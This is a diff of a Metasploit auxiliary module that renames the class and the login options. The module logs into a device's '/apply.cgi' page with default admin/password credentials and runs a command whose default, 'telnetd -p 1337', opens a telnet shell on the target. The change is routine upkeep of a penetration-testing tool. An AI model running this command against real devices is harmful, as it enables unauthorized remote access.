@@ -5,7 +5,7 @@
 
 require 'msf/core'
 
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::HttpClient
 
@@ -32,16 +32,16 @@ class Metasploit3 < Msf::Auxiliary
 
     register_options(
       [
-        OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
-        OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),
+        OptString.new('HttpUsername',[ true, 'User to login with', 'admin']),
+        OptString.new('HttpPassword',[ true, 'Password to login with', 'password']),
         OptString.new('CMD', [ true, 'The command to execute', 'telnetd -p 1337'])
       ], self.class)
   end
 
   def run
     uri = '/apply.cgi'
-    user = datastore['USERNAME']
-    pass = datastore['PASSWORD']
+    user = datastore['HttpUsername']
+    pass = datastore['HttpPassword']
 
     print_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")
 
